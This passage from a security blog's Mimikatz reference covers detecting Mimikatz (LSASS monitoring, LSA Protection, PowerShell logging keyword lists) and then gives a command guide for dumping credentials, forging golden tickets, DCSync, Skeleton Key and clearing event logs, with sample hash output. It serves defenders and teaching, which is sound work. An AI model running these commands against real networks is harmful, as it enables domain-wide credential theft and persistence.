<li>Mimikatz (as of October) <a href="http://blog.cobaltstrike.com/2015/11/11/revolutionary-device-detects-mimikatz-use/">activates attached BusyLights</a>. <em>[implemented in Mimikatz version 2.0 alpha 20151008 (oe.eo) edition]</em></li>
<li>Leverage security software to identify processes that interact with LSASS. Security software that monitors for process injection may also be able to regularly detect Mimikatz use.</li>
<li><a href="https://isc.sans.edu/diary/Detecting+Mimikatz+Use+On+Your+Network/19311">HoneyTokens/HoneyHashes</a> involves placing special credentials in memory on a number of computers in the enterprise. These credentials are flagged so when anyone attempts to use them, a critical alert goes out. this requires some sort of push method as well as placing credentials that are attractive to an attacker. In theory, this could detect credential theft and use in the environment.</li>
<li>If the WDIGEST registry key (HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest) is supposed to be set to &#8220;0&#8221; in the enterprise to prevent &#8220;clear-text&#8221; passwords from being stored in LSASS and there are systems where it was switched to &#8220;1&#8221;, this may be indicative of credential theft activity. This registry key is worth monitoring in your environment since an attacker may wish to set it to 0 to enable Digest password support which forces &#8220;clear-text&#8221; passwords to be placed in LSASS on any version of Windows from Windows 7/2008R2 up to Windows 10/2012R2 (probably 2016 as well).</li>
<li><a href="https://adsecurity.org/?p=1515">Forged Kerberos ticket detection is covered on this page I published in early 2015. These methods can detect Golden Tickets, Silver Tickets, and Trust Tickets</a>. I also have information on <a href="https://adsecurity.org/?p=763">how to detect MS14-068 Kerberos vulnerability exploitation</a>.</li>
<li>Enable LSA Protection on all Windows versions in the enterprise that supports it. This prevents Mimikatz from working &#8220;out-of-the-box&#8221; and requires use of the Mimikatz driver which logs events when it interacts with LSASS.</li>
</ul>
<h4><span style="text-decoration: underline;">Mimikatz &amp; LSA Protection:</span></h4>
<p>Windows Server 2012 R2 and Windows 8.1 includes a new feature called LSA Protection which involves enabling <a href="https://technet.microsoft.com/en-us/library/dn408187.aspx">LSASS as a protected process on Windows Server 2012 R2</a> (Mimikatz can bypass with a driver, but that should make some noise in the event logs):</p>
<p><em>The LSA, which includes the Local Security Authority Server Service (LSASS) process, validates users for local and remote sign-ins and enforces local security policies. The Windows 8.1 operating system provides additional protection for the LSA to prevent reading memory and code injection by non-protected processes. This provides added security for the credentials that the LSA stores and manages.</em></p>
<p><span style="text-decoration: underline;">Enabling LSA protection:</span></p>
<ol>
<li>Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa and Set the value of the registry key to: “RunAsPPL”=dword:00000001.</li>
<li>Create a new GPO and browse to Computer Configuration, Preferences, Windows Settings. Right-click Registry, point to New, and then click Registry Item. The New Registry Properties dialog box appears. In the Hive list, click HKEY_LOCAL_MACHINE. In the Key Path list, browse to SYSTEM\CurrentControlSet\Control\Lsa.  In the Value name box, type RunAsPPL. In the Value type box, click the REG_DWORD. In the Value data box, type 00000001.Click OK.</li>
</ol>
<p>LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (&#8220;!+&#8221;).</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg" rel="attachment wp-att-2178"><img class="alignnone wp-image-2178" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg" alt="Mimikatz-Driver-Remove-LSASS-Protection" width="281" height="139" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection-300x148.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg 682w" sizes="(max-width: 281px) 100vw, 281px" /></a></p>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>Detecting Invoke-Mimikatz:</strong></span></h3>
<ul>
<li>Ensure all Windows systems have PowerShell v3 or newer. Newer versions of PowerShell have better logging features, especially PowerShell v5.</li>
<li>Enable PowerShell Module Logging via Group Policy: Computer Configuration, Policies, Administrative Templates, Windows Components, and Windows PowerShell,Turn on Module Logging. Enter &#8220;*&#8221; and click OK. This will log all PowerShell activity including all PowerShell modules.</li>
</ul>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All.jpg" rel="attachment wp-att-2191"><img class="alignnone wp-image-2191" src="https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All.jpg" alt="PowerShellModuleLogging-All" width="319" height="294" srcset="https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All-300x276.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All.jpg 704w" sizes="(max-width: 319px) 100vw, 319px" /></a></p>
<ul>
<li>PowerShell activity will be logged to the PowerShell Operational Log. Push or pull these events to a central logging server (via <a href="http://blogs.technet.com/b/wincat/archive/2008/08/11/quick-and-dirty-large-scale-eventing-for-windows.aspx">Windows Event Forwarding or similar</a>) or SIEM.</li>
<li>Parse PowerShell events for the following:
<ul>
<li>“System.Reflection.AssemblyName”</li>
<li>“System.Reflection.Emit.AssemblyBuilderAccess “</li>
<li>“System.Runtime.InteropServices.MarshalAsAttribute”</li>
<li>“TOKEN_PRIVILEGES”</li>
<li> “SE_PRIVILEGE_ENABLED“</li>
</ul>
</li>
</ul>
<p><em>Note: While it may be possible to identify Mimikatz usage by alerting on &#8220;mimikatz&#8221;, &#8220;Delpy&#8221;, or &#8220;gentilkiwi&#8221;, a &#8220;sophisticated&#8221; attacker will likely roll their own version of Mimikatz or Invoke-Mimikatz without these keywords.</em></p>
<p>&nbsp;</p>
<h4><span style="text-decoration: underline;">Detecting Offensive PowerShell Tools:</span></h4>
<p>Many PowerShell offensive tools use the following calls which are logged in PowerShell Module Logging.</p>
<ul>
<li>“GetDelegateForFunctionPointer”</li>
<li>“System.Reflection.AssemblyName“</li>
<li>“System.Reflection.Emit.AssemblyBuilderAccess“</li>
<li>“System.Management.Automation.WindowsErrorReporting”</li>
<li>“MiniDumpWriteDump”</li>
<li>“TOKEN_IMPERSONATE”</li>
<li>“TOKEN_DUPLICATE”</li>
<li>“TOKEN_ADJUST_PRIVILEGES”</li>
<li>“TOKEN_PRIVILEGES”</li>
</ul>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>&#8220;Sneaky&#8221; Mimikatz Execution:</strong></span></h3>
<p>Casey Smith (<a href="https://twitter.com/subTee">@subtee </a>&amp; <a href="http://subt0x10.blogspot.com/">blog</a>) has done a LOT of work showing how <a href="http://subt0x10.blogspot.com/2015/11/your-whitelisting-application-has-no.html">application whitelisting is not the panacea many believe it to be</a>. Casey also has come up with many creative and sneaky ways to execute Mimikatz.</p>
<ul>
<li><a href="https://gist.github.com/subTee/0a5e6ef84c321ffc89e4">Execute Mimikatz Inside of RegSvcs or RegAsm &#8211; .NET utilities Proof of Concept</a></li>
<li><a href="http://subt0x10.blogspot.com/2015/11/your-whitelisting-application-has-no.html">Mimikatz packed &amp; hidden in an image file</a></li>
<li><a href="https://gist.github.com/subTee/7e3f8979eafbe65d63e2">Downloads and Executes Mimikatz In Memory From GitHub</a></li>
</ul>
<h3><span style="text-decoration: underline;"><strong>Most Popular Mimikatz Commands:</strong></span></h3>
<p>Here are just some of the most popular Mimikatz command and related functionality.</p>
<ul>
<li><a href="#CRYPTOCertificates">CRYPTO::Certificates</a> &#8211; list/export certificates</li>
<li><a href="#KERBEROSGolden">KERBEROS::Golden</a> &#8211; create golden/silver/trust tickets</li>
<li><a href="#KERBEROSList">KERBEROS::List</a> &#8211; List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user&#8217;s tickets.Similar to functionality of &#8220;klist&#8221;.</li>
<li><a href="#KERBEROSPTT">KERBEROS::PTT</a> &#8211; pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).</li>
<li><a href="#LSADUMPDCSync">LSADUMP::DCSync</a> &#8211; ask a DC to synchronize an object (get password data for account). No need to run code on DC.</li>
<li><a href="#LSADUMPLSA">LSADUMP::LSA</a> &#8211; Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: &#8220;/name:krbtgt&#8221;</li>
<li><a href="#LSADUMPSAM">LSADUMP::SAM</a> &#8211; get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.</li>
<li><a href="#LSADUMPTrust">LSADUMP::Trust </a>&#8211; Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).</li>
<li><a href="#MISCAddSid">MISC::AddSid</a> &#8211; Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID).</li>
<li><a href="#MISCMemSSP">MISC::MemSSP</a> &#8211; Inject a malicious Windows SSP to log locally authenticated credentials.</li>
<li><a href="#MISCSkeleton">MISC::Skeleton</a> &#8211; Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a &#8220;master password&#8221; (aka Skeleton Keys) as well as their usual password.</li>
<li><a href="#PRIVILEGEDebug">PRIVILEGE::Debug</a> &#8211; get debug rights (this or Local System rights is required for many Mimikatz commands).</li>
<li><a href="#SEKURLSAEkeys">SEKURLSA::Ekeys </a>&#8211; list Kerberos encryption keys</li>
<li><a href="#SEKURLSAKerberos">SEKURLSA::Kerberos</a> &#8211; List Kerberos credentials for all authenticated users (including services and computer account)</li>
<li><a href="#SEKURLSAKrbtgt">SEKURLSA::Krbtgt</a> &#8211; get Domain Kerberos service account (KRBTGT)password data</li>
<li><a href="#SEKURLSALogonPasswords">SEKURLSA::LogonPasswords </a>&#8211; lists all available provider credentials. This usually shows recently logged on user and computer credentials.</li>
<li><a href="#SEKURLSAPth">SEKURLSA::Pth</a> &#8211; Pass- theHash and Over-Pass-the-Hash</li>
<li><a href="#SEKURLSATickets">SEKURLSA::T`ickets</a> &#8211; Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer&#8217;s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).</li>
<li><a href="#TOKENList">TOKEN::List</a> &#8211; list all tokens of the system</li>
<li><a href="#TOKENElevate">TOKEN::Elevate</a> &#8211; impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box</li>
<li><a href="#TOKENElevate">TOKEN::Elevate /domainadmin</a> &#8211; impersonate a token with Domain Admin credentials.</li>
</ul>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>ADSecurity Mimikatz Posts:</strong></span></h3>
<p>All posts mentioning Mimikatz: <a href="https://adsecurity.org/?tag=mimikatz">ADSecurity.org Mimikatz Posts</a></p>
<ul>
<li><a href="https://adsecurity.org/?p=556">Mimikatz and Active Directory Kerberos Attacks</a>&#8220;</li>
<li><a href="https://adsecurity.org/?p=2053">Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync </a></li>
<li><a href="https://adsecurity.org/?p=2011">How Attackers Use Kerberos Silver Tickets to Exploit Systems </a></li>
<li><a href="https://adsecurity.org/?p=1729">Mimikatz DCSync Usage, Exploitation, and Detection </a></li>
<li><a href="https://adsecurity.org/?p=1760">Sneaky Active Directory Persistence #12: Malicious Security Support Provider (SSP)</a></li>
<li><a href="https://adsecurity.org/?p=1714">Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM) </a></li>
<li><a href="https://adsecurity.org/?p=1640">Kerberos Golden Tickets are Now More Golden </a></li>
<li><a href="https://adsecurity.org/?p=1588">It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts </a></li>
<li><a href="https://adsecurity.org/?p=1567">Detecting Mimikatz Use </a></li>
</ul>
<p>&nbsp;</p>
<h3><span style="text-decoration: underline;"><strong>Mimikatz Command Guide:</strong></span></h3>
<p>Mimikatz can be executed in interactive mode by simply running &#8220;Mimikatz.exe&#8221; or pass it a command and exit (example: &#8216;<em>Mimikatz &#8220;kerberos::list&#8221; exit&#8217;</em>). Invoke-Mimikatz does not have an interactive mode.</p>
<p>Mimikatz can be used to pass commands from the command line to Mimikatz for processing in order which is useful for Invoke-Mimikatz or when using Mimikatz in scripts. Appending &#8220;exit&#8221; exits Mimikatz after the last command is executed (do this so Mimikatz exits gracefully).</p>
<blockquote>
<pre><strong>PS C:\temp\mimikatz&gt; .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit</strong></pre>
<pre>.#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Nov 13 2015 00:44:32)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
 '#####'                                     with 17 modules * * */</pre>
<pre>mimikatz(commandline) # <em>privilege::debug</em>
 Privilege '20' OK</pre>
<pre>mimikatz(commandline) # <em>sekurlsa::logonpasswords</em></pre>
<pre>Authentication Id : 0 ; 646260 (00000000:0009dc74)
 Session           : RemoteInteractive from 2
 User Name         : adsadministrator
 Domain            : ADSECLAB
 Logon Server      : ADSDC03
 Logon Time        : 11/27/2015 11:41:27 AM
 SID               : S-1-5-21-1581655573-3923512380-696647894-500
 msv :
 [00000003] Primary
 * Username : ADSAdministrator
 * Domain   : ADSECLAB
 * NTLM     : 5164b7a0fda365d56739954bbbc23835
 * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
 [00010000] CredentialKeys
 * NTLM     : 5164b7a0fda365d56739954bbbc23835
 * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
 tspkg :
 wdigest :
 * Username : ADSAdministrator
 * Domain   : ADSECLAB
 * Password : (null)
 kerberos :
 * Username : adsadministrator
 * Domain   : LAB.ADSECURITY.ORG
 * Password : (null)
 ssp :   KO</pre>
</blockquote>
<p>&nbsp;</p>
<p>The interactive mode provides a &#8220;Mimikatz console&#8221; where commands can be entered and executed in real-time:</p>
<blockquote>
<pre><strong>PS C:\temp\mimikatz&gt; .\mimikatz</strong></pre>
<pre>.#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Nov 13 2015 00:44:32)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
 '#####'                                     with 17 modules * * */</pre>
<pre><strong>mimikatz # privilege::debug</strong>
 Privilege '20' OK</pre>
<pre><strong>mimikatz # sekurlsa::logonpasswords</strong></pre>
<pre>Authentication Id : 0 ; 646260 (00000000:0009dc74)
 Session           : RemoteInteractive from 2
 User Name         : adsadministrator
 Domain            : ADSECLAB
 Logon Server      : ADSDC03
 Logon Time        : 11/27/2015 11:41:27 AM
 SID               : S-1-5-21-1581655573-3923512380-696647894-500
 msv :
 [00000003] Primary
 * Username : ADSAdministrator
 * Domain   : ADSECLAB
 * NTLM     : 5164b7a0fda365d56739954bbbc23835
 * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
 [00010000] CredentialKeys
 * NTLM     : 5164b7a0fda365d56739954bbbc23835
 * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f
 tspkg :
 wdigest :
 * Username : ADSAdministrator
 * Domain   : ADSECLAB
 * Password : (null)
 kerberos :
 * Username : adsadministrator
 * Domain   : LAB.ADSECURITY.ORG
 * Password : (null)
 ssp :   KO
 credman :</pre>
</blockquote>
<h4></h4>
<h3><span style="text-decoration: underline;"><strong>Mimikatz Command Reference:</strong></span></h3>
<h4><span style="text-decoration: underline;">Mimikatz Modules:</span></h4>
<ul>
<li><a href="#CRYPTO">CRYPTO</a>
<ul>
<li><a href="#CRYPTOCertificates">CRYPTO::Certificates</a></li>
</ul>
</li>
<li><a href="#DPAPI">DPAPI</a></li>
<li><a href="#EVENT">EVENT</a></li>
<li><a href="#KERBEROS">KERBEROS</a>
<ul>
<li><a href="#KERBEROSGolden">Golden Tickets</a></li>
<li><a href="#SilverTicket">Silver Tickets</a></li>
<li><a href="#TrustTicket">Trust Tickets</a></li>
<li><a href="#KERBEROSPTT">KERBEROS::PTT</a></li>
</ul>
</li>
<li><a href="#LSADUMP">LSADUMP</a>
<ul>
<li><a href="#DCSync">DCSync</a></li>
<li><a href="#LSADUMPLSA">LSADUMP::LSA</a></li>
<li><a href="#LSADUMPSAM">LSADUMP::SAM</a></li>
<li><a href="#LSADUMPTrust">LSADUMP::Trust </a></li>
</ul>
</li>
<li><a href="#MISC">MISC</a></li>
<li><a href="#MINESWEEPER">MINESWEEPER</a></li>
<li><a href="#Net">NET</a></li>
<li><a href="#PRIVILEGE">PRIVILEGE</a>
<ul>
<li><a href="#PRIVILEGEDebug">PRIVILEGE::Debug</a></li>
</ul>
</li>
<li><a href="#PROCESS">PROCESS</a></li>
<li><a href="#SERVICE">SERVICE</a></li>
<li><a href="#SEKURLSA">SEKURLSA</a>
<ul>
<li><a href="#SEKURLSAKerberos">SEKURLSA::Kerberos</a></li>
<li><a href="#SEKURLSAKrbtgt">SEKURLSA::Krbtgt</a></li>
<li><a href="#SEKURLSALogonPasswords">SEKURLSA::LogonPasswords </a></li>
<li><a href="#SEKURLSAPth">SEKURLSA::Pth</a></li>
</ul>
</li>
<li><a href="#STANDARD">STANDARD</a></li>
<li><a href="#TOKEN">TOKEN</a>
<ul>
<li><a href="#TOKENElevate">TOKEN::Elevate</a></li>
<li><a href="#TOKENElevate">TOKEN::Elevate /domainadmin</a></li>
</ul>
</li>
<li><a href="#TS">TS</a></li>
<li><a href="#VAULT">VAULT</a></li>
</ul>
<p>NOTE: Any item marked &#8220;experimental&#8221; should only be used in test environments.</p>
<p><em><br />
</em></p>
<p><span id="more-1821"></span></p>
<h3><b><a id="CRYPTO"></a>CRYPTO</b></h3>
<p>The CRYPTO Mimikatz module provides advanced capability to interface with Windows cryptographic functions (<a href="https://msdn.microsoft.com/en-us/library/ms867086.aspx">CryptoAPI</a>).<br />
Typical use is to export certificates that aren&#8217;t marked as &#8220;exportable.&#8221;</p>
<p><b>CRYPTO::CAPI</b>&#8211; (experimental) Patch CryptoAPI layer for easy export</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI.jpg" rel="attachment wp-att-2158"><img class="alignnone wp-image-2158" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI.jpg" alt="Mimikatz-Crypto-CAPI" width="205" height="47" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI-300x69.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI.jpg 319w" sizes="(max-width: 205px) 100vw, 205px" /></a></p>
<p><a id="CRYPTOCertificates"></a><b>CRYPTO::Certificates</b> &#8211; list/export certificates</p>
<p>Carlos Perez (aka <a href="https://twitter.com/Carlos_Perez">DarkOperator</a>) has a<a href="http://www.darkoperator.com/blog/2013/6/11/stealing-user-certificates-with-meterpreter-mimikatz-extensi.html"> great blog post on using Mimikatz to export certificates</a>.<br />
This command lists certificates and properties of theirs keys. It can export certificates too. Typically requires &#8220;privilege::debug&#8221;</p>
<ul>
<li>/systemstore &#8211; optional &#8211; the system store that must be used (default: CERT_SYSTEM_STORE_CURRENT_USER)</li>
<li>/store &#8211; optional &#8211; the store that must be used to list/export certificates (default: My) &#8211; full list with crypto::stores</li>
<li>/export &#8211; optional &#8211; export all certificates to files (public parts in DER, private parts in PFX files &#8211; password protected with: mimikatz)</li>
</ul>
<p><span style="text-decoration: underline;">Benjamin&#8217;s comments on CRYPTO:Certificates:</span></p>
<ul>
<li>See <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-%7E-crypto#stores"><code>crypto::stores</code></a> for valid <code>systemstore</code> list, and its output for <code>store</code> list.</li>
<li>Non exportable keys (with <code>KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)</code>) can often be exported with <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-%7E-crypto#capi"><code>crypto::capi</code></a> and/or <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-%7E-crypto#cng"><code>crypto::cng</code></a></li>
<li>Despite <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-%7E-crypto#capi"><code>crypto::capi</code></a> or <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-%7E-crypto#cng"><code>crypto::cng</code></a> patch, you must have correct ACL on filesystem to access private keys (UAC&#8230; <img class="emoji" title=":wink:" src="https://camo.githubusercontent.com/eec6777dbcac389ce120a8b4218edabae0c68f39/68747470733a2f2f6173736574732d63646e2e6769746875622e636f6d2f696d616765732f69636f6e732f656d6f6a692f756e69636f64652f31663630392e706e67" alt=":wink:" width="20" height="20" align="absmiddle" data-canonical-src="https://assets-cdn.github.com/images/icons/emoji/unicode/1f609.png" />)</li>
<li>Some <strong>smartcard</strong> crypto providers can report a successfull private export (it&#8217;s not, of course <img class="emoji" title=":wink:" src="https://camo.githubusercontent.com/eec6777dbcac389ce120a8b4218edabae0c68f39/68747470733a2f2f6173736574732d63646e2e6769746875622e636f6d2f696d616765732f69636f6e732f656d6f6a692f756e69636f64652f31663630392e706e67" alt=":wink:" width="20" height="20" align="absmiddle" data-canonical-src="https://assets-cdn.github.com/images/icons/emoji/unicode/1f609.png" />)</li>
</ul>
<p>&nbsp;</p>
<p><b>CRYPTO::CNG</b>&#8211; (experimental) Patch CNG service for easy export (patches &#8220;KeyIso&#8221; service)</p>
<p><b>CRYPTO::Hash</b> &#8211; hash a password (with optional user name)</p>
<p><b>CRYPTO::Keys</b>&#8211; list/export keys containers</p>
<p><b>CRYPTO::Providers</b> &#8211; list cryptographic providers</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers.jpg" rel="attachment wp-att-2159"><img class="alignnone wp-image-2159" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers.jpg" alt="Mimikatz-Crypto-Providers" width="504" height="333" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers-300x198.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers-768x507.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers.jpg 887w" sizes="(max-width: 504px) 100vw, 504px" /></a></p>
<p><b>CRYPTO::Stores</b> &#8211; list cryptographic stores</p>
<ul>
<li>/systemstore &#8211; optional &#8211; the system store that must be used to list stores (default: CERT_SYSTEM_STORE_CURRENT_USER)</li>
</ul>
<p><span style="text-decoration: underline;">Store Options:</span><br />
CERT_SYSTEM_STORE_CURRENT_USER or CURRENT_USER<br />
CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY or USER_GROUP_POLICY<br />
CERT_SYSTEM_STORE_LOCAL_MACHINE or LOCAL_MACHINE<br />
CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY or LOCAL_MACHINE_GROUP_POLICY<br />
CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE or LOCAL_MACHINE_ENTERPRISE<br />
CERT_SYSTEM_STORE_CURRENT_SERVICE or CURRENT_SERVICE<br />
CERT_SYSTEM_STORE_USERS or USERS<br />
CERT_SYSTEM_STORE_SERVICES or SERVICES</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores.jpg" rel="attachment wp-att-2160"><img class="alignnone wp-image-2160" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores.jpg" alt="Mimikatz-Crypto-Stores" width="374" height="215" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores-300x173.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores.jpg 664w" sizes="(max-width: 374px) 100vw, 374px" /></a></p>
<p>&nbsp;</p>
<h3><b><a id="DPAPI"></a>DPAPI</b></h3>
<p><b>DPAPI::Blob</b> &#8211; Unprotect a DPAPI blob with API or Masterkey</p>
<p><b>DPAPI:Cache</b></p>
<p><b>DPAPI::CAPI</b> &#8211; CAPI key test</p>
<p><b>DPAPI::CNG</b> &#8211; CNG key test</p>
<p><b>DPAPI::Cred</b> &#8211; CRE test</p>
<p><b>DPAPI::CredHist</b> &#8211; Configure a Credhist file</p>
<p><b>DPAPI::MasterKey</b> &#8211; Configure a Masterkey file, unprotect (key depending)</p>
<p><b>DPAPI::Protect</b> &#8211; Protect data using DPAPI</p>
<p><b>DPAPI::Vault</b> &#8211; VAULT test</p>
<p>&nbsp;</p>
<h3><b><a id="EVENT"></a>EVENT</b></h3>
<p><b>EVENT::Clear</b> &#8211; Clear an event log</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png"><img class="alignnone size-full wp-image-1850" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png" alt="Mimikatz-Event-Clear" width="559" height="168" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear-300x90.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png 559w" sizes="(max-width: 559px) 100vw, 559px" /></a></p>
<p><b>EVENT:::Drop</b> &#8211; (<em><strong>experimental</strong></em>) Patch Events service to avoid new events</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png"><img class="alignnone wp-image-1851" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png" alt="Mimikatz-Event-Drop" width="272" height="48" /></a></p>
<h4></h4>
<h3><b><a id="KERBEROS"></a>KERBEROS</b></h3>
<p>The KERBEROS Mimikatz module is used to interface with the official Microsoft Kerberos API.<br />
No special rights are required for the commands in this module.</p>
<p><b>KERBEROS::Clist</b> &#8211; list tickets in MIT/Heimdall ccache</p>
<p><a id="KERBEROSGolden"></a><b>KERBEROS::Golden</b> &#8211; create <a href="https://adsecurity.org/?p=1640">golden</a>/<a href="https://adsecurity.org/?p=1515">silver</a>/<a href="https://adsecurity.org/?p=1588">trust</a> tickets<br />
The capability of this command is based on the password hash type retrieved.</p>
<table style="height: 109px;" width="468">
<tbody>
<tr>
<td width="183"><b>Type</b></td>
<td width="200"><b>Requirement</b></td>
<td width="400"><b>Scope</b></td>
</tr>
<tr>
<td width="183"><a href="https://adsecurity.org/?p=1640">Golden</a></td>
<td width="200">KRBTGT hash</td>
<td width="400">Domain/Forest</td>
</tr>
<tr>
<td width="183"><a href="https://adsecurity.org/?p=1515">Silver</a></td>
<td width="200">Service hash</td>
<td width="400">Service</td>
</tr>
<tr>
<td width="183"><a href="https://adsecurity.org/?p=1588">Trust</a></td>
<td width="200">Trust hash</td>
<td width="400">Domain/Forest -&gt; Domain/Forest<br />
(based on account access)</td>
</tr>
</tbody>
</table>
<h4><span style="text-decoration: underline;"><a id="GoldenTicket"></a><strong>Golden Ticket</strong></span></h4>
<p>A Golden Ticket is a TGT using the KRBTGT NTLM password hash to encrypt and sign.</p>
<p>A Golden Ticket (GT) can be created to impersonate any user (real or imagined) in the domain as a member of any group in the domain (providing a virtually unlimited amount of rights) to any and every resource in the domain. Since the Golden Ticket is an authentication ticket (TGT described below), its scope is the entire domain (and the AD forest by leveraging SID History) since the TGT is used to get service tickets (TGS) used to access resources. The Golden Ticket (TGT) contains user group membership information (PAC) and is signed and encrypted using the domain’s Kerberos service account (KRBTGT) which can only be opened and read by the KRBTGT account.</p>
<p>To summarize, once an attacker gets access to the KRBTGT password hash, they can create Golden Tickets (TGT) that provide access to anything in AD at any time.</p>
<p><span style="text-decoration: underline;">Mimikatz Golden Ticket Command Reference:</span></p>
<p>The Mimikatz command to create a golden ticket is “kerberos::golden”</p>
<ul type="disc">
<li>/domain &#8211; the fully qualified domain name. In this example: “lab.adsecurity.org”.</li>
<li>/sid &#8211; the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.</li>
<li>/sids &#8211; Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain  “S-1-5-21-1473643419-774954089-5872329127-519”. T<a href="https://adsecurity.org/?p=1640">his parameter adds the provided SIDs to the SID History parameter.</a></li>
<li>/user &#8211; username to impersonate</li>
<li>/groups (optional) – group RIDs the user is a member of (the first is the primary group).<br />
Add user or computer account RIDs to receive the same access.<br />
Default Groups: 513,512,520,518,519 for the well-known Administrator&#8217;s groups (listed below).</li>
<li>/krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.</li>
<li>/ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.</li>
<li>/ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.</li>
<li>/id (optional) &#8211; user RID. Mimikatz default is 500 (the default Administrator account RID).</li>
<li>/startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.</li>
<li>/endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).</li>
<li>/renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).</li>
